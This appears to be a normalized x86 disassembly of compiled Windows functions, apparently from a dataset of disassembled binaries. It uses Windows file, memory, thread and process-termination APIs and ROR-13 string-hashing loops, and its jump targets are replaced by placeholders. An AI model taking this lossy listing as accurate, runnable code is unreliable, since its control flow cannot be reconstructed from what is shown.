mov ecx [ ebp - 0xcc ]
mov edx [ esi + 0x10 ]
add ecx ebx
mov eax 0x5d
mov [ edx + ecx * 2 ] ax
movzx ecx [ esi ]
inc ebx
mov [ ebp - 0xa4 ] ebx
cmp ebx ecx
je r-xdata
mov [ ebp - 0x9f ] 0x1
cmp [ ebp - 0x9d ] 0x0
jne r-xdata
mov edx [ esi + 0xc ]
add edx ebx
push edx
mov ecx esi
call sub_40f7b0
cmp eax [ ebp - 0xec ]
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ ebp - 0xd0 ]
add eax [ ebp - 0xbc ]
push 0x0
push 0x0
push 0x230
push ecx
mov ecx [ esi + 0xc ]
push eax
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ecx [ ebp - 0xac ]
push 0x0
lea edx [ ebp - 0xb4 ]
push edx
push eax
mov eax [ esi + 0x14 ]
push eax
push ecx
call [ WriteFile@IAT ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0xb8 ]
add ecx [ ebp - 0xc8 ]
push 0x0
push 0x0
push 0x230
push eax
mov eax [ esi + 0x8 ]
push ecx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push eax
mov eax [ ebp - 0xac ]
push edx
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0x9d ] 0x1
mov [ ebp - 0xec ] eax
sub_410350
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
lea ecx [ esi + 0x4 ]
mov [ esi ] edx
push 0xffffffff
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
push eax
mov [ ebp - 0x4 ] eax
mov [ ecx ] al
mov eax [ ebp + 0x10 ]
push eax
call sub_4075e0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_410390
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov esi [ eax ]
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov [ edi + 0x4 ] 0x0
cmp esi [ edi ]
je r-xdata
pop edi
pop esi
retn
push ebx
jmp r-xdata
cmp [ esi + 0x20 ] 0x10
mov ebx [ esi ]
jb r-xdata
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] 0x0
call sub_41a0d6
add esp 0x4
mov esi ebx
cmp ebx [ edi ]
jne r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
pop ebx
sub_4103f0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
lea ecx [ esi + 0x4 ]
mov [ esi ] edx
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ ecx ] al
mov eax [ ebp + 0x10 ]
push eax
call sub_4079c0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_410430
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ edx ]
push ebx
push esi
push edi
mov esi ecx
xor ecx ecx
xor edi edi
test ax ax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_419e08
cmp [ esi + 0x24 ] 0x0
je r-xdata
movzx eax ax
ror edi 0xd
inc ecx
add edi eax
movzx eax [ edx + ecx * 2 ]
test ax ax
jne r-xdata
pop edi
pop esi
xor al al
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
mov [ esi + 0x2c ] ecx
cmp ecx eax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_419e11
mov ecx [ esi + 0x2c ]
cmp [ ecx + 0x8 ] edi
je r-xdata
mov edi ecx
cmp edi [ esi + 0x20 ]
je r-xdata
mov eax [ ecx ]
mov [ esi + 0x2c ] eax
cmp eax [ esi + 0x20 ]
jne r-xdata
lea ecx [ esi + 0x4 ]
call sub_419e11
pop edi
pop esi
mov al 0x1
pop ebx
pop ebp
retn 0x4
mov edx [ edi + 0x4 ]
mov eax [ edi ]
mov [ edx ] eax
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
cmp [ edi + 0x20 ] 0x10
jb r-xdata
mov [ edi + 0x20 ] 0xf
mov [ edi + 0x1c ] 0x0
push edi
mov [ edi + 0xc ] 0x0
call sub_41a0d6
add esp 0x4
dec [ esi + 0x24 ]
mov eax [ edi + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
sub_410510
push ebp
mov ebp esp
push 0xffffffff
push sub_42e181
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x28
call sub_41ac18
mov esi eax
xor ebx ebx
add esp 0x4
mov [ ebp - 0x14 ] esi
cmp esi ebx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] ebx
call sub_419f97
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_41ac98
int3
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ esi ] eax
lea eax [ esi + 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
mov [ eax ] ecx
lea ecx [ eax + 0x4 ]
add edx 0x4
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_4079c0
sub_4105e0
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x24 ] ebx
je r-xdata
mov edx [ edi + 0xc ]
mov esi [ VirtualFree@IAT ]
push 0x2000
push ebx
push edx
call esi
mov eax [ edi + 0x8 ]
push 0x2000
push ebx
push eax
call esi
mov ecx [ edi + 0x10 ]
push 0x2000
push ebx
push ecx
call esi
mov edx [ edi + 0x14 ]
push edx
call sub_41a7eb
mov eax [ edi + 0x18 ]
push eax
call sub_41a7eb
mov ecx [ edi + 0x1c ]
push ecx
call sub_41a7eb
add esp 0xc
lea ecx [ edi + 0x20 ]
call sub_410390
mov edx [ edi + 0x20 ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ edi + 0x4 ]
pop edi
pop esi
pop ebx
jmp sub_419df1
lea esp [ esp ]
cmp [ edi + 0x24 ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi ]
mov eax [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ edi + 0x20 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
push esi
mov [ esi + 0xc ] bl
call sub_41a0d6
add esp 0x4
dec [ edi + 0x24 ]
mov ecx [ esi + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
sub_4106a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e1d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea ecx [ ebx + 0x4 ]
mov [ ebp - 0x5c ] ebx
call sub_419dd7
xor edi edi
lea esi [ ebx + 0x20 ]
push 0x28
mov [ ebp - 0x4 ] edi
mov [ esi + 0x4 ] edi
call sub_41ac18
add esp 0x4
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x60 ] edi
call sub_419f97
push r--data
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6c ] r--data
call sub_41ac98
int3
mov [ esi ] eax
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x2c ] edi
push 0x18
mov [ ebp - 0x4 ] 0x1
mov [ ebx ] 0x32
call sub_41ac18
add esp 0x4
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
xor ebx ebx
mov ecx eax
call sub_412420
mov ebx eax
jmp r-xdata
push r--data
call sub_4194e6
inc ecx
mov [ esi + 0x4 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov edi 0x10
mov [ ecx ] eax
cmp [ ebp - 0x18 ] edi
jb r-xdata
push 0xb
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_4124b0
mov [ ebp - 0x58 ] rw-data
mov [ ebp - 0x54 ] rw-data
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x50 ]
add [ ebp - 0x54 ] 0x1e
add [ ebp - 0x58 ] 0x4
add eax 0x1e
mov [ ebp - 0x50 ] eax
cmp eax 0x23a
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x54 ]
push 0x1e
push eax
mov ecx ebx
call sub_412490
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx ebx
call sub_412890
mov edx [ ebp - 0x58 ]
push eax
push edx
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_4103f0
add esp 0xc
mov ecx [ esi ]
mov edi [ ecx ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_410510
mov ecx [ esi + 0x4 ]
mov edx 0x7fffffe
sub edx ecx
cmp edx 0x1
jb r-xdata
test ebx ebx
je r-xdata
mov esi [ ebp - 0x5c ]
movzx edx [ esi ]
mov edi [ VirtualAlloc@IAT ]
push 0x4
push 0x3000
add edx 0x14
push edx
push 0x0
call edi
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov ecx ebx
call sub_412460
push ebx
call sub_41a0d6
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
push 0x4
push 0x3000
push 0x104
push 0x0
call edi
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
push 0x4
push 0x3000
push 0x118
push 0x0
call edi
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x1
push eax
call sub_41acef
push 0x1
push 0x104
mov [ esi + 0x14 ] eax
call sub_41acef
push 0x1
push 0x104
mov [ esi + 0x18 ] eax
call sub_41acef
add esp 0x18
mov [ esi + 0x1c ] eax
sub_4108f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e218
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
xor edx edx
xor edi edi
test ax ax
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea esi [ eax + 0x2 ]
mov edi edi
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_403650
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
mov ecx edx
cmp eax 0x8
jae r-xdata
movzx eax ax
ror edi 0xd
inc edx
add edi eax
movzx eax [ ecx + edx * 2 ]
test ax ax
jne r-xdata
mov esi [ ebp - 0x1c ]
cmp eax 0x8
lea ecx [ ecx + esi * 2 ]
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x70 ]
push edx
push ecx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
call sub_40c5c0
mov [ ebp - 0x4 ] 0x1
test edi edi
jne r-xdata
lea eax [ ebp - 0x2c ]
lea ecx [ ebx + 0x4 ]
mov [ ebp - 0x6c ] ecx
call sub_419e08
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov [ ebx + 0x2c ] ecx
cmp ecx eax
je r-xdata
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_410350
add esp 0xc
mov ecx [ ebx + 0x20 ]
mov edi [ ecx ]
push eax
mov eax [ edi + 0x4 ]
push eax
push edi
lea ecx [ ebx + 0x20 ]
mov [ ebp - 0x4 ] 0x2
call sub_410510
mov ecx [ ebx + 0x24 ]
mov edx 0x7fffffe
sub edx ecx
cmp edx 0x1
jae r-xdata
lea ebx [ ebx ]
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_41a0d6
add esp 0x4
inc ecx
mov [ ebx + 0x24 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov esi 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] esi
jb r-xdata
push r--data
call sub_4194e6
mov ecx [ ebp - 0x6c ]
call sub_419e11
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov eax [ edx ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x20 ]
cmp [ ebx + 0x2c ] eax
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x6c ]
call sub_419e11
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
mov edx [ ebx + 0x2c ]
cmp [ edx + 0x8 ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
sub_410b10
push ebp
mov ebp esp
push 0xffffffff
push sub_42e240
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_412030
push 0x0
call sub_41b214
sub_410ba0
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ecx [ ecx ]
mov eax [ esi + 0x4 ]
pop edi
cmp eax ebx
je r-xdata
lea ebx [ ebx ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn
push eax
call sub_41a0d6
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_41a0d6
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
sub_410c30
push ebp
mov ebp esp
push 0xffffffff
push sub_42e27e
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov edi [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x2
test edi edi
je r-xdata
lea ecx [ esi + 0x34 ]
call sub_410ba0
mov eax [ esi + 0x34 ]
push eax
call sub_41a0d6
add esp 0x4
lea ecx [ esi + 0x1c ]
mov [ esi + 0x34 ] 0x0
call sub_410ba0
mov ecx [ esi + 0x1c ]
push ecx
call sub_41a0d6
mov [ esi + 0x1c ] 0x0
add esp 0x4
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_411490
push edi
call sub_41a0d6
add esp 0x4
sub_410ce0
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x44 ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x34 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_410d60
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x24 ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x14 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_410de0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
test ebx ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
mov esi [ ebx + 0x10 ]
push edi
push 0x1
push esi
call sub_41acef
mov edi eax
add esp 0x8
test edi edi
je r-xdata
cmp [ ebx + 0x14 ] 0x10
pop edi
pop esi
jb r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
push ebx
mov [ ebx ] 0x0
call sub_41a0d6
add esp 0x4
mov ecx [ ebx ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
xor eax eax
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0x7 ] dl
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] esi
mov [ eax ] 0x0
jmp r-xdata
push esi
push eax
push edi
call sub_41a0f0
push 0x10
call sub_41ac18
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x2c
call sub_413120
sub_410ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e2c9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x18 ] edi
xor eax eax
mov [ edi + 0x4 ] ax
xor ebx ebx
mov [ edi + 0x8 ] r--data
mov [ edi + 0xc ] bl
mov [ edi + 0x10 ] 0xffffffff
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
lea esi [ edi + 0x1c ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] ebx
call sub_419f97
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x30 ] r--data
call sub_41ac98
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea esi [ edi + 0x34 ]
push 0x8
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] ebx
call sub_419f97
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_41ac98
mov [ esi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ esi ]
mov [ edx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov ax [ rw-data ]
push 0x44
mov [ ebp - 0x4 ] 0x2
mov [ edi + 0x14 ] ebx
mov [ edi + 0x4 ] ax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_411d00
jmp r-xdata
lea ecx [ edi + 0x8 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
mov [ edi + 0x18 ] eax
call sub_411370
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411000
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_410c30
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_411030
push ebp
mov ebp esp
push 0xffffffff
push sub_42e33a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
jne r-xdata
mov bl [ eax + 0x6 ]
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax esi
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
mov ecx eax
call sub_412420
mov esi eax
mov [ ebp - 0x10 ] esi
jmp r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi eax
add eax 0x4
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
test esi esi
je r-xdata
jmp [ eax * 4 + jump_table_411354 ]
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_4124b0
movzx eax bl
add eax 0xffffff9b
cmp eax 0x4
ja r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
mov eax [ edi + 0x18 ]
mov ecx [ eax + 0x40 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x18 ]
mov eax [ ecx + 0x40 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ edi + 0x18 ]
mov edx [ ecx + 0x40 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ eax + 0x40 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ eax + 0x40 ]
cmp [ ecx + 0x4 ] 0x0
mov ecx esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
push 0x0
push 0x0
push eax
push sub_410b10
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0xbb8
mov [ edi + 0x14 ] eax
call [ Sleep@IAT ]
mov edx [ edi + 0x18 ]
mov eax [ edx + 0x40 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0xc ]
push 0x1c
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
push 0xb
push rw-data
mov ecx esi
call sub_412490
push 0x1c
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push 0x19
push rw-data
push 0x18
push rw-data
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push 0x1c
push rw-data
mov ecx esi
call sub_412490
push 0x1c
call sub_41ac18
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
push edx
push esi
mov [ ebp - 0x14 ] 0x0
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x14 ]
push eax
push esi
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x10 ]
test eax eax
setne al
test al al
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
push ebx
push ecx
mov ecx eax
call sub_40c2f0
jmp r-xdata
push eax
mov ecx esi
call sub_412890
jmp r-xdata
xor eax eax
push eax
mov ecx esi
call sub_412890
jmp r-xdata
call sub_412490
push 0x1c
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x6
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0x10 ]
push eax
call sub_412890
jmp r-xdata
push 0x1b
push rw-data
push 0x14
push rw-data
jmp r-xdata
push 0xa
push 0x1
mov ecx eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
call sub_40bae0
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ edi + 0x1c ]
call sub_413120
jmp r-xdata
mov edx [ edi + 0x8 ]
lea ecx [ edi + 0x8 ]
push eax
